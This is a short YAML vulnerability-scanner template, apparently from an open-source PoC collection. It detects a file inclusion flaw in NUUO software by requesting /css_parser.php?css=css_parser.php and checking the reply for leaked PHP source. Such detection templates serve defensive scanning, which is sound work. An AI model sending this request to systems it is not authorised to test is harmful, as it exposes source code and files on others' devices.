detail:
  author: 2357000166(https://github.com/2357000166)
  links:
  - https://www.exploit-db.com/exploits/40211
expression: r0()
manual: true
name: poc-yaml-nuuo-file-inclusion
rules:
  r0:
    expression: response.status == 200 && response.headers["content-type"] == "text/css"
      && response.body.bcontains(b"$_GET['css']")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /css_parser.php?css=css_parser.php
transport: http
